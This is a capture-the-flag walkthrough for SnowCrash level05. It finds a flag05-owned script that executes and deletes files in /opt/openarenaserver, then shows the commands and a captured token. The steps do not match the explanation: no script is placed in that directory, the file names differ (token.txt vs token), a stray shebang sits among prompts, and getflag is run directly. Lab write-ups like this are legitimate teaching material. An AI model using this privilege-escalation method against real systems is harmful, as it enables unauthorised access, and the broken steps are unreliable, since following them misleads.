To find the fifth flag, we use the find command to search for a file owned by **flag05** that we have permission to read:

```bash
**level05@SnowCrash:~$** find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

**level05@SnowCrash:~$** cat /rofs/usr/sbin/openarenaserver
cat: /rofs/usr/sbin/openarenaserver: Permission denied

**level05@SnowCrash:~$** cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

We find a script which runs any scripts found in directory **/opt/openarenaserver/** then deletes them after execution.

We have permissions to add our own scripts in the directory. As everything in this directory is deleted, we create a file into **/tmp** to save the result and set the appropriate permissions so the script can write to it.

```bash
level05@SnowCrash:~$ touch /tmp/my_dir/token.txt
level05@SnowCrash:~$ chmod 777 /tmp/my_dir/token.txt

#!/bin/bash

level05@SnowCrash:~$ echo "'getflag'" | sh > /tmp/my_dir/token
```

Checking the token file:

```bash
level05@SnowCrash:~$ cat /tmp/my_dir/token
Check flag.Here is your token : **viuaaale9huek52boumoomioc**
```
